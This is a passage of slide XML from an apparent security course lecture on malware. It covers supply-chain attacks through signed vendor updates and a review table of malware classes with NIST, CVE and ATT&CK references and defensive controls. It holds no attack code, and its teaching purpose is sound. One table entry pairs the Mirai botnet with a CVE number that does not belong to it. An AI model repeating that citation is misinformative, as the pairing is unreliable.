                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Trusted Delivery:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The trojanized software update is distributed to thousands or millions of customers through the vendor's legitimate, digitally signed update channel, bypassing email filtering, AV scanning, and user suspicion.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mass Compromise:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Each customer organization installs the malicious update, believing it to be legitimate, unwittingly granting the attacker access to their environment.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Supply Chain Attacks, Malware Through Trusted Channels (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_supply_chain_attack.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Supply chain attack model, by compromising the vendor, the attacker inherits the transitive trust relationship between the vendor and all of its customers, achieving mass compromise through a single point of attack</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Consolidated Key Concepts &amp; Assessment Preparation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This slide consolidates the essential concepts, definitions, and relationships from Class 16 that will appear on assessments and in professional practice, organized by malware class, with associated standards references and defensive controls.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="280556" y="2093369"/>
          <a:ext cx="10555354" cy="3976841"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638840"/>
              </a:tblGrid>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Concept</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Key Definition</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Standard Reference</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Primary Defensive Control</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Malware Taxonomy</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Classified by propagation vector, trigger, and payload</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NIST SP 800-83 Rev. 1</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Defense-in-depth (SP 800-53)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Virus</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Self-replicating via host file; requires human action</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NIST SP 800-83</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>File Integrity Monitoring (SI-7)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Worm</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Autonomous propagation via network exploits; no human action</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CVE-2017-0144 (EternalBlue)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Network Segmentation (SC-7) + Patching (SI-2)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Trojan</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Deceptive wrapper; establishes C2 backdoor</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>MITRE ATT&amp;CK T1055, T1059</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Application Allowlisting (CM-7)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Ransomware</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Hybrid AES+RSA encryption; double extortion</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>MITRE ATT&amp;CK T1486</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Immutable Backups (CP-9)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Spyware</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Covert credential harvesting; DNS tunnel exfiltration</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>MITRE ATT&amp;CK T1056</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Behavioral EDR (SI-4)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Rootkit</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>OS-level persistence; DKOM process hiding</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>MITRE ATT&amp;CK T1014</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Secure Boot; kernel integrity</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Fileless Malware</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Memory-resident; LotL techniques; no disk artifacts</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>MITRE ATT&amp;CK T1059.001</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>PowerShell logging; AMSI</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Botnet</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Coordinated C2 of compromised hosts; DDoS, spam</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Mirai (CVE-2016-6563)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Network isolation; IoT segmentation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Zero-Day</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Unknown flaw; no patch at exploitation time</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CVE assignment process</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Behavioral detection; exploit mitigations</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Supply Chain</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Vendor compromise for transitive trust exploitation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>EO 14028 / NIST SP 800-218</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
